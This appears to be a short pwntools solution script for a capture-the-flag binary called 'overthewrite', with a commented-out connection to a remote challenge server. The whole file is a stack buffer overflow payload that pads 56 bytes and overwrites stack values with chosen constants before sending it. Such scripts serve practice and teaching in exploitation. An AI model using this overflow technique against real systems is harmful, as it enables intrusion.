from pwn import *
#r = remote("159.89.197.210", 9992)
r = process("./overthewrite")

p = b"a"*56 + p64(0x1111111111111111) + p64(0xdeadbeefcafebabe) + b"aaaa"+ p32(0x13371337)
gdb.attach(r, api = True)
r.sendline(p)
r.interactive()
